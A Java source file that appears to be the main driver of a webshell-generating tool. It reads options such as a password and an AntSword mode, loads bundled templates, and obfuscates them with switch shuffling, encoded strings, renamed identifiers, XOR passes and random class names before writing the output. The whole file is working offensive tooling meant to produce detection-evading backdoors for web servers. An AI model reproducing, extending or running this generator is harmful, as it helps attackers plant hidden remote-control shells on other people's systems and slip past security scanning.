package org.sec.start;

import com.beust.jcommander.JCommander;
import com.github.javaparser.StaticJavaParser;
import com.github.javaparser.ast.CompilationUnit;
import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
import com.github.javaparser.ast.body.ConstructorDeclaration;
import com.github.javaparser.ast.body.MethodDeclaration;
import com.github.javaparser.ast.expr.ArrayInitializerExpr;
import com.github.javaparser.ast.expr.StringLiteralExpr;
import com.github.javaparser.ast.type.ClassOrInterfaceType;
import org.sec.Main;
import org.sec.input.Command;
import org.sec.input.Logo;
import org.sec.module.IdentifyModule;
import org.sec.module.StringModule;
import org.sec.module.SwitchModule;
import org.sec.module.XORModule;
import org.sec.util.FileUtil;
import org.sec.util.RandomUtil;
import org.sec.util.WriteUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

public class Application {
    public static void start(String[] args) {
        try {
            Logo.PrintLogo();
            System.out.println("Wait 1 Minute ... ");
            Command command = new Command();
            JCommander jc = JCommander.newBuilder().addObject(command).build();
            jc.parse(args);
            if (command.help) {
                jc.usage();
            }
            if (command.javascript) {
                doJavaScript(command);
                return;
            }
            if (command.superModule) {
                doSuper(command);
                return;
            }
            if (command.antSword) {
                doAnt(command);
                return;
            }
            doSimple(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void base(Command command, String method) throws IOException {
        MethodDeclaration jsMethod = getMethod(method);
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (jsMethod == null || decMethod == null) {
            return;
        }
        normalOperate(jsMethod);
        decCodeOperate(decMethod);
        WriteUtil.write(jsMethod, decMethod, command.password, command.unicode);
        System.out.println("Finish!");
    }

    private static void doJavaScript(Command command) throws IOException {
        base(command, "JS.java");
    }

    private static void doSimple(Command command) throws IOException {
        base(command, "Base.java");
    }

    private static void doSuper(Command command) throws IOException {
        MethodDeclaration superMethod = getMethod("Javac.java");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (superMethod == null || decMethod == null) {
            return;
        }
        normalOperate(superMethod);
        decCodeOperate(decMethod);
        WriteUtil.writeSuper(superMethod, decMethod, command.password, command.unicode);
        System.out.println("Finish!");
    }

    private static void doAnt(Command command) throws IOException {
        MethodDeclaration antMethod = getMethod("Ant.java");
        MethodDeclaration antDecMethod = getMethod("AntBase64.java");
        MethodDeclaration decMethod = getMethod("Dec.java");
        List<ClassOrInterfaceDeclaration> antClasses = getAntClass();
        String antClassName = RandomUtil.getRandomString(10);

        if (antMethod == null) {
            return;
        }
        List<ArrayInitializerExpr> arrayExpr = antMethod.findAll(ArrayInitializerExpr.class);
        StringLiteralExpr expr = (StringLiteralExpr) arrayExpr.get(0).getValues().get(1);
        expr.setValue(command.password);

        String antClassCode = null;
        String antDecCode;
        String antCode;
        String decCode;

        // Ant Class
        for (ClassOrInterfaceDeclaration c : antClasses) {
            if (!c.getNameAsString().equals("Ant")) {
                c.setName(antClassName);
                ConstructorDeclaration cd = c.findFirst(ConstructorDeclaration.class).isPresent() ?
                        c.findFirst(ConstructorDeclaration.class).get() : null;
                if (cd == null) {
                    return;
                }
                cd.setName(antClassName);
                IdentifyModule.doConstructIdentify(cd);
                XORModule.doXORForConstruct(cd);
                c.findAll(MethodDeclaration.class).forEach(m -> {
                            IdentifyModule.doIdentify(m);
                            XORModule.doXOR(m);
                            XORModule.doXOR(m);
                        }
                );
                antClassCode = c.toString();
            }
        }
        // Base64 Dec
        if (decMethod == null || antDecMethod == null) {
            return;
        }
        int offset = StringModule.encodeString(antDecMethod);
        StringModule.changeRef(antDecMethod, offset);
        XORModule.doXOR(antDecMethod);
        XORModule.doXOR(antDecMethod);
        antDecCode = antDecMethod.toString();
        // Ant Code
        antMethod.findAll(ClassOrInterfaceType.class).forEach(ci -> {
            if (ci.getNameAsString().equals("U")) {
                ci.setName(antClassName);
            }
        });
        normalOperate(antMethod);
        String antCodeTmp = antMethod.getBody().isPresent() ?
                antMethod.getBody().get().toString() : null;
        if (antCodeTmp == null) {
            return;
        }
        antCode = antCodeTmp.substring(1, antCodeTmp.length() - 2);
        // Dec Code
        decCodeOperate(decMethod);
        decCode = decMethod.toString();

        WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode);
        System.out.println("Finish!");
    }

    private static MethodDeclaration getMethod(String name) throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream(name);
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findFirst(MethodDeclaration.class).isPresent() ?
                unit.findFirst(MethodDeclaration.class).get() : null;
    }

    private static List<ClassOrInterfaceDeclaration> getAntClass() throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream("Ant.java");
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findAll(ClassOrInterfaceDeclaration.class);
    }

    private static void normalOperate(MethodDeclaration method) {
        String newValue = SwitchModule.shuffle(method);
        SwitchModule.changeSwitch(method, newValue);
        int offset = StringModule.encodeString(method);
        StringModule.changeRef(method, offset);
        IdentifyModule.doIdentify(method);
        XORModule.doXOR(method);
        XORModule.doXOR(method);
    }

    private static void decCodeOperate(MethodDeclaration decMethod) {
        int decOffset = StringModule.encodeString(decMethod);
        StringModule.changeRef(decMethod, decOffset);
        IdentifyModule.doIdentify(decMethod);
        XORModule.doXOR(decMethod);
    }
}
